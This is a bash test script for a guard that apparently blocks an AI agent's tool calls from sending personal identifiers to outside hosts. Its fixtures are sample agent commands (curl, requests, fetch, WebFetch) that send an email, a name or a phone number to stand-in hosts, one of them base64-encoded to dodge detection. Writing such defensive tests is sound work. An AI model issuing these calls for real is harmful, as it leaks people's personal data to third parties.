#!/usr/bin/env bash
# Unit tests against example identifiers. Run: bash test/run-tests.sh
cd "$(dirname "$0")/.." || exit 1
export PII_GUARD_IDENTIFIERS="$PWD/identifiers.example.txt"
pass=0; fail=0
check() { # expected_exit description json
  printf '%s' "$3" | python3 guard.py >/dev/null 2>&1; got=$?
  if [ "$got" = "$1" ]; then pass=$((pass+1)); echo "ok   $2"; else fail=$((fail+1)); echo "FAIL $2 (got $got, want $1)"; fi
}
B64=$(printf 'user=jane.doe@example.com' | base64)
check 2 "curl header with email"     '{"tool_name":"Bash","tool_input":{"command":"curl -H \"X-Agent-User: jane.doe@example.com\" https://api.example.net"}}'
check 2 "python requests with name"  '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import requests; requests.get(\\\"https://x.example\\\", headers={\\\"X-User\\\": \\\"Jane Doe\\\"})\""}}'
check 2 "phone, formatted"           '{"tool_name":"Bash","tool_input":{"command":"curl -H \"X-Phone: +1 (555) 010-4477\" https://x.example"}}'
check 2 "base64-encoded email"       "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"curl -H 'X-Id: $B64' https://x.example\"}}"
check 2 "email in WebFetch query"    '{"tool_name":"WebFetch","tool_input":{"url":"https://x.example/?u=jane.doe%40example.com","prompt":"x"}}'
check 2 "MCP tool running fetch()"   '{"tool_name":"mcp__node_repl__js","tool_input":{"code":"await fetch(\"https://x.example\",{headers:{\"X-User\":\"jane.doe@example.com\"}})"}}'
check 0 "git commit with name + URL" '{"tool_name":"Bash","tool_input":{"command":"git commit --author \"Jane Doe <jane.doe@example.com>\" -m \"see https://example.com\""}}'
check 0 "plain curl, no identifiers" '{"tool_name":"Bash","tool_input":{"command":"curl -s https://example.com/docs"}}'
check 0 "messaging MCP tool"         '{"tool_name":"mcp__whatsapp__send","tool_input":{"to":"Mom","text":"Jane Doe here, running late"}}'
PII_GUARD_IDENTIFIERS=/nonexistent check 2 "missing identifiers file fails closed" '{"tool_name":"Bash","tool_input":{"command":"curl https://x.example"}}'
echo "$pass passed, $fail failed"; [ "$fail" = 0 ]
